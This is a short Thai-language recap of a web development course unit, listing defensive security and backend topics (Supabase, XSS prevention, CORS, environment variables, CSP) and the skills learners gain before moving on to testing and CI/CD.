✅ Supabase: Database, CRUD, Row Level Security
✅ Realtime: WebSocket Subscription สำหรับ Live Update
✅ XSS: การป้องกันและ Sanitize Input
✅ CORS: สาเหตุและการแก้ด้วย Proxy Pattern
✅ Environment Variables: แยก Secret ออกจาก Code
✅ CSP: Header เสริมความปลอดภัย

เมื่อจบ Unit 5 คุณสามารถ:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
→ สร้างแอปที่ Login ด้วย Google ได้จริง
→ ดึงข้อมูลจาก API อย่างถูกวิธีด้วย TanStack Query
→ บันทึกและดึงข้อมูลผู้ใช้จาก Supabase
→ แสดงข้อมูล Real-time โดยไม่ต้อง Refresh
→ เขียนโค้ดที่ปลอดภัยจากช่องโหว่พื้นฐาน
→ พร้อมสำหรับ Unit 6: Testing, CI/CD และการทำงานในทีมจริง
```

---

*ปรับปรุงล่าสุด: พฤษภาคม 2026*
